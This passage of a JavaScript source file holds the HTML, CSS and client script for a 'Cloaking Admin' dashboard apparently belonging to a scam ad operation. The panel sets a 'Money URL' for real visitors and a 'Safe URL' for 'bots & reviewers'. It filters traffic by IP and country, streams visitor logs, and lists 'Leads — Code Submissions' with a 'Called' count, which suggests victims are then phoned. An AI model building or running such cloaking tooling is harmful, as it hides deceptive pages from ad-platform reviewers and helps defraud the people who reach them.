.toggle-row{display:flex;align-items:center;gap:14px;margin-bottom:14px;flex-wrap:wrap}
.toggle-row p{font-size:0.82rem;color:#777}
form.inline{display:inline}
button{padding:9px 18px;border:none;border-radius:8px;font-size:0.85rem;font-weight:600;cursor:pointer;transition:background .2s}
.btn-primary{background:#7c3aed;color:#fff}.btn-primary:hover{background:#6d28d9}
.btn-danger{background:#7f1d1d;color:#fca5a5}.btn-danger:hover{background:#991b1b}
.btn-success{background:#14532d;color:#4ade80}.btn-success:hover{background:#166534}
.btn-sm{padding:6px 13px;font-size:0.78rem}

/* ── Stats ── */
.stats-row{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:10px}
.stat{flex:1;min-width:90px;background:#0d0018;border:1px solid #2e1655;border-radius:10px;padding:14px 10px;text-align:center}
.stat .num{font-size:1.7rem;font-weight:800;display:block;line-height:1}
.stat .lbl{font-size:0.7rem;color:#666;margin-top:5px;display:block}
.allow-num{color:#4ade80}.block-num{color:#f87171}.total-num{color:#a78bfa}.rate-num{color:#fb923c}

/* ── Country bars ── */
.cc-row{display:flex;align-items:center;gap:8px;margin-bottom:9px}
.cc-flag{font-size:1.1rem;width:22px;text-align:center}
.cc-code{font-size:0.78rem;font-weight:700;color:#c084fc;width:26px}
.cc-bar-wrap{flex:1;background:#0d0018;border-radius:4px;height:8px;overflow:hidden}
.cc-bar{height:100%;background:linear-gradient(90deg,#7c3aed,#a855f7);border-radius:4px;transition:width .4s}
.cc-cnt{font-size:0.78rem;color:#888;width:30px;text-align:right}

/* ── Reason pills (summary) ── */
.pills-wrap{display:flex;flex-wrap:wrap;gap:8px}
.pill{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;border-radius:20px;font-size:0.78rem}
.pill strong{font-size:0.88rem}
.pill-orange{background:#431407;color:#fb923c}
.pill-amber{background:#451a03;color:#fbbf24}
.pill-red{background:#450a0a;color:#f87171}
.pill-grey{background:#1c1c2e;color:#888}

/* ── Form inputs ── */
label{display:block;font-size:0.78rem;color:#aaa;margin-bottom:5px;margin-top:14px}
label:first-child{margin-top:0}
input[type=text],input[type=url],textarea{width:100%;padding:9px 12px;background:#0d0018;border:1px solid #2e1655;border-radius:8px;color:#e0e0e0;font-size:0.85rem;outline:none;font-family:inherit}
input:focus,textarea:focus{border-color:#a855f7}
textarea{resize:vertical;font-size:0.78rem;font-family:'SF Mono',Menlo,monospace;line-height:1.5}

/* ── Traffic controls counters ── */
.tc-meta{display:flex;gap:12px;margin-bottom:14px;flex-wrap:wrap}
.tc-chip{background:#0d0018;border:1px solid #2e1655;border-radius:8px;padding:8px 12px;font-size:0.76rem;color:#888}
.tc-chip strong{color:#c084fc}

/* ── Log table ── */
.log-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
table{width:100%;border-collapse:collapse;font-size:0.76rem}
th{text-align:left;padding:8px 10px;color:#a78bfa;border-bottom:1px solid #2e1655;font-weight:600;white-space:nowrap;background:#120824;position:sticky;top:0}
td{padding:6px 10px;border-bottom:1px solid #160928;color:#ccc;white-space:nowrap}
td.mono{font-family:'SF Mono',Menlo,monospace;font-size:0.72rem;color:#888}
td.ua{max-width:180px;overflow:hidden;text-overflow:ellipsis;color:#777}
td.isp{max-width:140px;overflow:hidden;text-overflow:ellipsis;color:#9ca3af}
td.allow{color:#4ade80;font-weight:700}
td.block{color:#f87171;font-weight:700}
tr:hover td{background:rgba(124,58,237,0.07)}

/* ── Reason pills (table) ── */
.rpill{display:inline-block;padding:2px 9px;border-radius:12px;font-size:0.7rem;font-weight:600}
.rpill-green{background:#14532d;color:#4ade80}
.rpill-orange{background:#431407;color:#fb923c}
.rpill-amber{background:#451a03;color:#fbbf24}
.rpill-red{background:#450a0a;color:#f87171}
.rpill-grey{background:#1c1c2e;color:#888}

.empty{font-size:0.82rem;color:#444;font-style:italic}
.hint{font-size:0.72rem;color:#555;margin-top:6px}
.dl-btn{display:inline-block;padding:10px 20px;background:#1a0d2e;border:1px solid #7c3aed;border-radius:9px;color:#c084fc;font-size:0.85rem;font-weight:700;text-decoration:none;transition:background .2s,border-color .2s}
.dl-btn:hover{background:#2d1060;border-color:#a855f7}

/* ── Live Activity panel ── */
.live-card{background:#0d1a10;border:1px solid #1a4d2a;border-radius:12px;padding:18px 22px;margin-bottom:18px;display:flex;gap:24px;align-items:flex-start;flex-wrap:wrap}
.live-left{min-width:160px}
.live-title{font-size:0.72rem;text-transform:uppercase;letter-spacing:1.2px;color:#4ade80;font-weight:700;margin-bottom:10px;display:flex;align-items:center;gap:7px}
@keyframes livepulse{0%,100%{box-shadow:0 0 0 0 rgba(74,222,128,0.6)}70%{box-shadow:0 0 0 6px rgba(74,222,128,0)}}
.live-dot{width:9px;height:9px;border-radius:50%;background:#4ade80;display:inline-block;animation:livepulse 1.8s infinite}
.live-count{font-size:2.4rem;font-weight:800;color:#4ade80;line-height:1}
.live-count-lbl{font-size:0.7rem;color:#4a8a5e;margin-top:4px}
.live-feed{flex:1;min-width:0}
.lf-row{display:flex;gap:8px;align-items:center;padding:5px 0;border-bottom:1px solid #162b1e;font-size:0.74rem;flex-wrap:wrap}
.lf-row:last-child{border-bottom:none}
.lf-ts{color:#555;font-family:'SF Mono',Menlo,monospace;min-width:130px}
.lf-ip{color:#7dd3a8;font-family:'SF Mono',Menlo,monospace;min-width:110px}
.lf-loc{color:#888;flex:1;min-width:80px}
.lf-dec{font-weight:700;min-width:44px}
.lf-allow{color:#4ade80}
.lf-block{color:#f87171}
.lf-reason{color:#666;font-size:0.68rem}

/* ── Pagination ── */
.pagination{display:flex;align-items:center;gap:10px;margin-top:14px;justify-content:center;flex-wrap:wrap}
.pag-btn{padding:6px 16px;border-radius:8px;background:#1a0d2e;border:1px solid #3d1f6e;color:#c084fc;font-size:0.8rem;font-weight:600;text-decoration:none;transition:background .2s}
.pag-btn:hover{background:#2d1060}
.pag-disabled{padding:6px 16px;border-radius:8px;background:#0d0018;border:1px solid #1f1035;color:#444;font-size:0.8rem;font-weight:600;cursor:default}
.pag-info{font-size:0.78rem;color:#777}

/* ── Site selector bar ── */
.site-bar{background:#100820;border-bottom:1px solid #230e4a;padding:8px 28px;display:flex;align-items:center;gap:10px;flex-wrap:wrap}
.site-bar label{font-size:0.75rem;color:#666;white-space:nowrap}
.site-select{background:#0d0018;border:1px solid #3d1f6e;border-radius:8px;color:#c084fc;font-size:0.82rem;padding:5px 10px;outline:none;cursor:pointer}
.site-select:focus{border-color:#a855f7}
.site-filter-badge{display:inline-block;padding:3px 10px;background:#2d1060;border:1px solid #7c3aed;border-radius:20px;font-size:0.72rem;color:#c084fc;font-weight:600}
.site-created-flash{padding:3px 12px;background:#14532d;border:1px solid #4ade80;border-radius:20px;font-size:0.72rem;color:#4ade80;font-weight:600}

/* ── Sites management card ── */
.site-row{background:#0d0018;border:1px solid #2e1655;border-radius:10px;padding:16px;margin-bottom:12px}
.site-row:last-child{margin-bottom:0}
.site-row-hdr{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:12px}
.site-name{font-size:0.9rem;font-weight:700;color:#c084fc}
.site-domain{font-size:0.75rem;color:#666}
.deploy-badge{display:inline-block;padding:2px 9px;border-radius:12px;font-size:0.7rem;font-weight:700;text-transform:uppercase;letter-spacing:0.5px}
.db-live{background:#14532d;color:#4ade80}
.db-pushed{background:#1e3a5f;color:#60a5fa}
.db-pending{background:#451a03;color:#fbbf24}
.db-failed{background:#450a0a;color:#f87171}
.db-rotated{background:#2d1060;color:#a78bfa}
.site-key-wrap{display:flex;align-items:center;gap:8px;margin-bottom:10px;flex-wrap:wrap}
.site-key-val{font-family:'SF Mono',Menlo,monospace;font-size:0.72rem;color:#a78bfa;background:#160930;padding:5px 10px;border-radius:6px;border:1px solid #3d1f6e;flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.copy-btn{padding:4px 10px;font-size:0.7rem;background:#1a0d2e;border:1px solid #7c3aed;border-radius:6px;color:#c084fc;cursor:pointer;white-space:nowrap;transition:background .2s}
.copy-btn:hover{background:#2d1060}
.site-urls{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:10px}
.site-url-chip{font-size:0.7rem;color:#888;background:#0d0010;border:1px solid #1f1035;border-radius:6px;padding:3px 8px;font-family:'SF Mono',Menlo,monospace}
.site-url-chip a{color:#a78bfa;text-decoration:none}
.site-url-chip a:hover{color:#c084fc}
.snippet-wrap{margin-bottom:12px}
.snippet-toggle{background:none;border:1px solid #2e1655;border-radius:6px;padding:4px 10px;color:#888;font-size:0.72rem;cursor:pointer;margin-bottom:6px;width:100%;text-align:left}
.snippet-toggle:hover{border-color:#7c3aed;color:#c084fc}
.snippet-box{display:none;background:#060010;border:1px solid #2e1655;border-radius:8px;padding:12px;font-family:'SF Mono',Menlo,monospace;font-size:0.68rem;color:#7dd3a8;line-height:1.5;overflow-x:auto;white-space:pre-wrap;word-break:break-all;position:relative}
.snippet-box.open{display:block}
.snippet-copy{position:absolute;top:8px;right:8px;padding:3px 8px;font-size:0.68rem;background:#1a0d2e;border:1px solid #3d1f6e;border-radius:5px;color:#c084fc;cursor:pointer}
.site-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
.site-details-toggle{background:none;border:1px solid #2e1655;border-radius:6px;padding:5px 12px;color:#888;font-size:0.74rem;cursor:pointer;transition:all .2s}
.site-details-toggle:hover{border-color:#7c3aed;color:#c084fc}
.site-settings-panel{display:none;margin-top:14px;border-top:1px solid #1f1035;padding-top:14px}
.site-settings-panel.open{display:block}
.form-grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:700px){.form-grid2{grid-template-columns:1fr}}
</style>
</head>
<body>

<header>
  <div class="hdr-left">
    <h1>&#9680; StreamFix Hub — Cloaking Admin</h1>
    <div class="hdr-urls">
      Money URL: <span>${escHtml(settings.moneyUrl || '—')}</span>
      &nbsp;&nbsp;|&nbsp;&nbsp;
      Safe URL: <span>${escHtml(settings.safeUrl || '—')}</span>
    </div>
  </div>
  <div class="hdr-right">
    <span class="hdr-time">Last updated: ${timeStr} UTC</span>
    <form method="POST" action="/admin/clear-leads" class="inline" onsubmit="return confirm('Clear all leads?')">
      <button type="submit" class="btn-danger btn-sm">Clear Leads</button>
    </form>
    <form method="POST" action="/admin/clear-logs" class="inline" onsubmit="return confirm('Clear all logs?')">
      <button type="submit" class="btn-danger btn-sm">Clear Logs</button>
    </form>
    <button class="sound-btn" id="soundToggle" title="Toggle notification sound">
      <svg id="soundIcon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 0 1 0 7.07"/><path id="soundWave2" d="M19.07 4.93a10 10 0 0 1 0 14.14"/></svg>
    </button>
    <div class="notif-wrap">
      <button class="notif-btn" id="notifBtn" title="Notifications">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
        <span class="notif-badge" id="notifBadge">0</span>
      </button>
      <div class="notif-dropdown" id="notifDropdown">
        <div class="notif-hdr">
          <span>Notifications</span>
          <button class="notif-clear" id="notifClear">Clear all</button>
        </div>
        <div class="notif-list" id="notifList">
          <div class="notif-empty">No notifications yet</div>
        </div>
      </div>
    </div>
    <a href="/admin/logout">Sign out</a>
  </div>
</header>

${siteBarHtml}

<div class="container">

  <!-- Sites Management Card -->
  ${sitesCardHtml}

  <!-- Live Activity Panel -->
  <div class="live-card">
    <div class="live-left">
      <div class="live-title"><span class="live-dot"></span> Live</div>
      <div class="live-count" id="live-count">${activeCount}</div>
      <div class="live-count-lbl">active visitor${activeCount !== 1 ? 's' : ''} (last 3 min)</div>
    </div>
    <div class="live-feed">
      <div id="live-feed">${liveInitRows || '<div style="color:#444;font-size:0.78rem;padding:4px 0">Waiting for traffic…</div>'}</div>
    </div>
  </div>

  <!-- Row 1: Engine + Stats -->
  <div class="grid2">

    <div class="card">
      <h2>Cloaking Engine</h2>
      <div class="toggle-row">
        ${statusBadge}
        <p>Traffic filtering is ${settings.enabled ? 'active' : 'inactive'}</p>
      </div>
      <form method="POST" action="/admin/toggle" class="inline">
        <button type="submit" class="${settings.enabled ? 'btn-danger' : 'btn-success'}">${toggleLabel}</button>
      </form>
    </div>

    <div class="card">
      <h2>Traffic Stats</h2>
      <div class="stats-row">
        <div class="stat"><span class="num allow-num">${todayAllow}</span><span class="lbl">Today Allowed</span></div>
        <div class="stat"><span class="num block-num">${todayBlock}</span><span class="lbl">Today Blocked</span></div>
        <div class="stat"><span class="num total-num">${todayTotal}</span><span class="lbl">Today Total</span></div>
      </div>
      <div class="stats-row">
        <div class="stat"><span class="num allow-num" style="font-size:1.3rem">${allAllow}</span><span class="lbl">All-time Allowed</span></div>
        <div class="stat"><span class="num block-num" style="font-size:1.3rem">${allBlock}</span><span class="lbl">All-time Blocked</span></div>
        <div class="stat"><span class="num rate-num" style="font-size:1.3rem">${blockRate}%</span><span class="lbl">Block Rate</span></div>
      </div>
    </div>

  </div>

  <!-- Row 2: Top Countries + Block Reasons + URL Settings -->
  <div class="grid3">

    <div class="card">
      <h2>Top Countries</h2>
      ${countryRows}
    </div>

    <div class="card">
      <h2>Block Reasons</h2>
      <div class="pills-wrap">${reasonPills}</div>
    </div>

    <div class="card">
      <h2>URL Settings</h2>
      <form method="POST" action="/admin/settings">
        <label for="moneyUrl">Money URL — real visitors see this</label>
        <input type="text" id="moneyUrl" name="moneyUrl" value="${escHtml(settings.moneyUrl || '')}" placeholder="https://your-offer-url.com">
        <label for="safeUrl">Safe URL — bots &amp; reviewers see this</label>
        <input type="text" id="safeUrl" name="safeUrl" value="${escHtml(settings.safeUrl || '/safe')}" placeholder="/safe">
        <button type="submit" class="btn-primary" style="margin-top:16px;width:100%">Save URLs</button>
      </form>
    </div>

  </div>

  <!-- Row 3: Traffic Controls (full width) -->
  <div class="grid3" style="margin-bottom:18px">

    <div class="card">
      <h2>Blocked IPs</h2>
      <div class="tc-meta">
        <div class="tc-chip">Permanently blocked: <strong>${blockedIpsList.length}</strong> IP${blockedIpsList.length !== 1 ? 's' : ''}</div>
        <div class="tc-chip" title="Logged repeat-click blocks in last 24h — does not reset when tracker is cleared">Repeat-click blocks (log, 24h): <strong>${repeatClicksIn24h}</strong></div>
        <div class="tc-chip">Active tracker (unique IPs): <strong>${freqStoreSize}</strong>
          &nbsp;<form method="POST" action="/admin/clear-frequency" class="inline" onsubmit="return confirm('Reset the repeat-click tracker? Tracked IPs will be allowed once more, but log counts are unchanged.')">
            <button type="submit" class="btn-danger btn-sm" style="padding:2px 8px;font-size:0.7rem">Reset Tracker</button>
          </form>
        </div>
      </div>
      <form method="POST" action="/admin/blocked-ips">
        <label for="blockedIps">Paste IPs to permanently block (one per line)</label>
        <textarea id="blockedIps" name="blockedIps" rows="6" placeholder="1.2.3.4&#10;5.6.7.8&#10;...">${escHtml(blockedIpsList.join('\n'))}</textarea>
        <p class="hint">Get these from your Google Ads campaign &rarr; Audiences tab &rarr; IP addresses column</p>
        <button type="submit" class="btn-primary" style="margin-top:12px;width:100%">Save Blocked IPs</button>
      </form>
    </div>

    <div class="card">
      <h2>Country Filter</h2>
      <div class="tc-meta">
        <div class="tc-chip">
          ${allowedCountriesList.length > 0
            ? 'Allowing: <strong>' + escHtml(allowedCountriesList.join(', ')) + '</strong>'
            : '<strong>All countries</strong> allowed (no filter)'}
        </div>
      </div>
      <form method="POST" action="/admin/allowed-countries">
        <label for="allowedCountries">Allowed country codes (comma or space separated)</label>
        <input type="text" id="allowedCountries" name="allowedCountries"
          value="${escHtml(allowedCountriesList.join(', '))}"
          placeholder="US, CA, GB — leave blank to allow all">
        <p class="hint">Use 2-letter ISO codes. Leave blank to allow all countries. Example: US CA GB AU</p>
        <button type="submit" class="btn-primary" style="margin-top:12px;width:100%">Save Country Filter</button>
      </form>
      ${allowedCountriesList.length > 0 ? '<form method="POST" action="/admin/allowed-countries" class="inline" style="margin-top:8px;display:block"><input type="hidden" name="allowedCountries" value=""><button type="submit" class="btn-danger btn-sm" style="width:100%;margin-top:8px" onclick="return confirm(\'Remove country filter?\')">Remove Filter (Allow All)</button></form>' : ''}
    </div>

    <div class="card">
      <h2>How Click Fraud Protection Works</h2>
      <div style="font-size:0.78rem;color:#777;line-height:1.7">
        <p style="margin-bottom:8px"><span style="color:#fb923c;font-weight:600">Repeat Click</span> — same IP within 24 hours is automatically blocked. Resets daily.</p>
        <p style="margin-bottom:8px"><span style="color:#fb923c;font-weight:600">Manual Block</span> — IPs you paste above are permanently refused. Find them in Google Ads &rarr; Reports &rarr; IP addresses.</p>
        <p style="margin-bottom:8px"><span style="color:#fb923c;font-weight:600">Country Block</span> — if you set a country filter, visitors whose country does not match are blocked after geolocation. Use this to restrict traffic to countries where your customers actually are.</p>
        <p style="color:#555;font-size:0.7rem">Tip: also add competitor IPs directly to Google Ads under Campaign Settings &rarr; IP Exclusions — this blocks them before they even click your ad.</p>
      </div>
    </div>

  </div>

  <!-- Google Ads IP Export -->
  <div class="card" style="margin-bottom:18px">
    <h2>Stop Bad Visitors — Export &amp; Block Options</h2>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:18px">

      <div>
        <p style="font-size:0.82rem;color:#ccc;margin-bottom:10px">
          Download every IP this system has ever blocked — both manually added ones and auto-detected bots/fraud — as a plain text file. Then paste the list into Google Ads to stop those visitors from ever seeing your ad again.
        </p>
        <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:14px">
          <span style="font-size:0.78rem;color:#888">Unique public IPs ready to export:</span>
          <span style="font-size:1.3rem;font-weight:800;color:#f87171">${exportCount}</span>
        </div>
        <a href="/admin/blocked-ips-export" download="blocked-ips.txt" class="dl-btn">&#8681; Download blocked-ips.txt</a>
      </div>

      <div style="font-size:0.78rem;color:#777;line-height:1.8">
        <p style="color:#a78bfa;font-weight:700;margin-bottom:8px;font-size:0.8rem">How to use the downloaded file</p>
        <p style="margin-bottom:6px"><span style="color:#fb923c;font-weight:600">Google Ads (most effective)</span><br>
          Ads &rarr; your campaign &rarr; Settings &rarr; <em>IP exclusions</em>. Paste the IPs one per line. This stops fraud clicks <em>before</em> they reach your site and saves your ad budget.</p>
        <p style="margin-bottom:6px"><span style="color:#fb923c;font-weight:600">Manual block on this site</span><br>
          Paste the same IPs into the "Blocked IPs" card above — they'll be instantly refused at the door.</p>
        <p><span style="color:#fb923c;font-weight:600">Railway firewall (optional)</span><br>
          In Railway &rarr; your service &rarr; Networking you can block IPs at the infrastructure level, before they touch the server.</p>
      </div>

    </div>
  </div>

  <!-- Leads -->
  <div class="card" style="margin-bottom:18px">
    <h2>Leads — Code Submissions</h2>
    <div class="stats-row" style="margin-bottom:16px">
      <div class="stat"><span class="num allow-num">${todaySubmits.length}</span><span class="lbl">Today</span></div>
      <div class="stat"><span class="num total-num">${allSubmits.length}</span><span class="lbl">All-time</span></div>
      <div class="stat"><span class="num" style="color:#c084fc">${calledLeads.length}</span><span class="lbl">Called</span></div>
      <div class="stat"><span class="num rate-num">${callRate}%</span><span class="lbl">Call Rate</span></div>
    </div>
    <div class="log-wrap">
      <table>
        <thead>
          <tr>
            <th>Time</th>
            <th>IP</th>
            <th>Location</th>
            <th>Device</th>
            <th>Code</th>
            <th>Ad Source</th>
            <th>Called</th>
          </tr>
        </thead>
        <tbody>
          ${leadRows || '<tr><td colspan="7" style="text-align:center;color:#444;padding:24px">No leads yet</td></tr>'}
        </tbody>
      </table>
    </div>
    ${leadPaginationHtml}
  </div>

  <!-- Decision Log -->
  <div class="card">
    <h2>Decision Log — ${logTotal} entries total</h2>
    <div class="log-wrap">
      <table>
        <thead>
          <tr>
            <th>Time</th>
            <th>IP</th>
            <th>Location</th>
            <th>ISP</th>
            <th>Screen</th>
            <th>Device</th>
            <th>User Agent</th>
            <th>Decision</th>
            <th>Reason</th>
          </tr>
        </thead>
        <tbody>
          ${logRows || '<tr><td colspan="9" style="text-align:center;color:#444;padding:24px">No entries yet</td></tr>'}
        </tbody>
      </table>
    </div>
    ${logPaginationHtml}
  </div>

</div>
<script>
(function() {
  /* ── Live feed ─────────────────────────────────────────────────────────── */
  var feed    = document.getElementById('live-feed');
  var countEl = document.getElementById('live-count');
  var activeTimes = {};

  function escH(s) {
    return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  function makeRow(e) {
    var ts  = (e.ts||'').replace('T',' ').slice(0,19);
    var loc = (e.city ? escH(e.city) + ', ' : '') + escH(e.country||'XX');
    var cls = e.decision==='allow' ? 'lf-allow' : 'lf-block';
    var row = document.createElement('div');
    row.className = 'lf-row';
    row.innerHTML = '<span class="lf-ts">'+ts+'</span>'
      + '<span class="lf-ip">'+escH(e.ip||'')+'</span>'
      + '<span class="lf-loc">'+loc+'</span>'
      + '<span class="lf-dec '+cls+'">'+escH(e.decision||'')+'</span>'
      + '<span class="lf-reason">'+escH(e.reason||'')+'</span>';
    return row;
  }

  function updateCount() {
    var cutoff = Date.now() - 3 * 60 * 1000;
    var n = 0;
    for (var ip in activeTimes) { if (activeTimes[ip] > cutoff) n++; }
    if (countEl) countEl.textContent = n;
  }

  var seedTimes = ${activeIpTimesJson};
  for (var sip in seedTimes) { activeTimes[sip] = seedTimes[sip]; }
  updateCount();

  /* ── Sound ─────────────────────────────────────────────────────────────── */
  var soundEnabled = localStorage.getItem('sfx_sound') !== 'off';
  var audioCtx = null;

  function getAudioCtx() {
    if (!audioCtx) {
      try { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); } catch(e) {}
    }
    return audioCtx;
  }

  function playTing(type) {
    if (!soundEnabled) return;
    var ctx = getAudioCtx();
    if (!ctx) return;
    try {
      var osc  = ctx.createOscillator();
      var gain = ctx.createGain();
      osc.connect(gain);
      gain.connect(ctx.destination);
      if (type === 'allow') {
        osc.type = 'sine';
        osc.frequency.setValueAtTime(1318, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(1046, ctx.currentTime + 0.15);
        gain.gain.setValueAtTime(0.28, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.55);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.55);
      } else {
        osc.type = 'sine';
        osc.frequency.setValueAtTime(440, ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(330, ctx.currentTime + 0.18);
        gain.gain.setValueAtTime(0.22, ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
        osc.start(ctx.currentTime);
        osc.stop(ctx.currentTime + 0.4);
      }
    } catch(e) {}
  }

  /* ── Sound toggle button ────────────────────────────────────────────────── */
  var soundBtn  = document.getElementById('soundToggle');
  var soundWave = document.getElementById('soundWave2');

  function applySoundUI() {
    if (!soundBtn) return;
    if (soundEnabled) {
      soundBtn.classList.remove('muted');
      soundBtn.title = 'Sound ON — click to mute';
      if (soundWave) soundWave.style.display = '';
    } else {
      soundBtn.classList.add('muted');
      soundBtn.title = 'Sound OFF — click to enable';
      if (soundWave) soundWave.style.display = 'none';
    }
  }
  applySoundUI();

  if (soundBtn) {
    soundBtn.addEventListener('click', function() {
      soundEnabled = !soundEnabled;
      localStorage.setItem('sfx_sound', soundEnabled ? 'on' : 'off');
      applySoundUI();
      if (soundEnabled) playTing('allow');
    });
  }

  /* ── Notification bell ─────────────────────────────────────────────────── */
  var notifBtn      = document.getElementById('notifBtn');
  var notifDropdown = document.getElementById('notifDropdown');
  var notifBadge    = document.getElementById('notifBadge');
  var notifList     = document.getElementById('notifList');
  var notifClear    = document.getElementById('notifClear');
  var unread = 0;
  var notifications = [];

  function updateBadge() {
    if (!notifBadge) return;
    if (unread > 0) {
      notifBadge.textContent = unread > 99 ? '99+' : unread;
      notifBadge.classList.add('show');
    } else {
      notifBadge.classList.remove('show');
    }
  }

  function renderNotifList() {
    if (!notifList) return;
    if (notifications.length === 0) {
      notifList.innerHTML = '<div class="notif-empty">No notifications yet</div>';
      return;
    }
    notifList.innerHTML = notifications.slice(0, 30).map(function(n) {
      var decCls = n.decision === 'allow' ? 'notif-dec-allow' : 'notif-dec-block';
      var decLabel = n.decision === 'allow' ? '✓ ALLOWED' : '✗ BLOCKED';
      var loc = (n.city ? escH(n.city) + ', ' : '') + escH(n.country || 'XX');
      return '<div class="notif-item">'
        + '<div class="notif-item-top">'
        +   '<span class="notif-ip">' + escH(n.ip || '') + '</span>'
        +   '<span class="notif-time">' + escH((n.ts||'').replace('T',' ').slice(0,19)) + '</span>'
        + '</div>'
        + '<div style="display:flex;gap:10px;align-items:center">'
        +   '<span class="notif-loc">' + loc + '</span>'
        +   '<span class="' + decCls + '">' + decLabel + (n.reason ? ' · ' + escH(n.reason) : '') + '</span>'
        + '</div>'
        + '</div>';
    }).join('');
  }

  if (notifBtn) {
    notifBtn.addEventListener('click', function(e) {
      e.stopPropagation();
      notifDropdown.classList.toggle('open');
      if (notifDropdown.classList.contains('open')) {
        unread = 0;
        updateBadge();
      }
    });
  }

  document.addEventListener('click', function(e) {
    if (notifDropdown && notifDropdown.classList.contains('open')) {
      if (!notifDropdown.contains(e.target) && e.target !== notifBtn) {
        notifDropdown.classList.remove('open');
      }
    }
  });

  if (notifClear) {
    notifClear.addEventListener('click', function() {
      notifications = [];
      unread = 0;
      updateBadge();
      renderNotifList();
    });
  }

  function addNotification(entry) {
    notifications.unshift(entry);
    if (notifications.length > 50) notifications.pop();
    if (!notifDropdown || !notifDropdown.classList.contains('open')) {
      unread++;
      updateBadge();
    }
    renderNotifList();
  }

  /* ── SSE ───────────────────────────────────────────────────────────────── */
  if (!window.EventSource) return;

  var es = new EventSource('/admin/events');
  es.onmessage = function(ev) {
    var msg;
    try { msg = JSON.parse(ev.data); } catch(e) { return; }
    if (msg.type !== 'log') return;
    var entry = msg.entry;

    if (entry.ip) activeTimes[entry.ip] = Date.now();
    updateCount();

    if (feed) {
      var placeholder = feed.querySelector('div[style]');
      if (placeholder) placeholder.remove();
      var row = makeRow(entry);
      feed.insertBefore(row, feed.firstChild);
      var rows = feed.querySelectorAll('.lf-row');
      while (rows.length > 8) { feed.removeChild(feed.lastChild); rows = feed.querySelectorAll('.lf-row'); }
    }

    playTing(entry.decision);
    addNotification(entry);
  };
  es.onerror = function() {};
})();

// ── Sites helpers ─────────────────────────────────────────────────────────────
function copyKey(elId, key, btn) {
  navigator.clipboard.writeText(key).then(function() {
    var orig = btn.textContent;
    btn.textContent = 'Copied!'; btn.style.color = '#4ade80';
    setTimeout(function() { btn.textContent = orig; btn.style.color = ''; }, 2000);
  }).catch(function() { prompt('Copy API key:', key); });
}
function toggleSnippet(id, btn) {
  var el = document.getElementById(id);
  if (!el) return;
  el.classList.toggle('open');
  btn.textContent = el.classList.contains('open')
    ? '<\\/> Hide integration script'
    : '<\\/> Show integration script — paste this in your site\\'s <head>';
}
function copySnippet(id, btn) {
  var el = document.getElementById(id);
  if (!el) return;
  var text = el.innerText.replace(/^Copy\\n?/, '').trim();
  navigator.clipboard.writeText(text).then(function() {
    var orig = btn.textContent;
    btn.textContent = 'Copied!'; btn.style.color = '#4ade80';
    setTimeout(function() { btn.textContent = orig; btn.style.color = ''; }, 2000);
  }).catch(function() { prompt('Copy snippet:', text); });
}
function togglePanel(id, btn) {
  var el = document.getElementById(id);
  if (!el) return;
  el.classList.toggle('open');
  btn.innerHTML = el.classList.contains('open') ? '&#9881; Hide Settings' : '&#9881; Settings';
}
</script>
</body>
</html>`;
}

function escHtml(str) {
  return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
